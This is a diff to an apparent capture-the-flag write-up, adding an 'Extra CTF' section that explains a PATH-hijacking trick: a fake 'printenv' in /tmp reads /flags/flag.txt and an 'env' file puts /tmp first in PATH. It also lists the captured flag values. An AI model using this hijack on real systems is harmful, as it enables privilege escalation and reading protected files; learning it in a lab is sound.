@@ -251,4 +251,22 @@ r.interactive()
 
 **Flag 2** - flag{0e68e08552b7bfe81eb7f7201d81d023}
 
+## Extra CTF 
+
+* create in /tmp the file printenv with :
+    ```console
+        cat /flags/flag.txt > printenv
+        chmod 777 printenv
+    ```
+* create in /tmp the file env with:
+    ```console
+        echo PATH="/tmp:$PATH" > env
+    ```
+
+The program will run automatically and if you check last_log in /tmp you will see the flag because the printenv has been replaced with our version.
+
+![Extra_result](/images/CTF%205/Extra/flag.png)
+
+**Extra flag** - flag{f8aec487d4db57089b34e440a2163762}
+
 
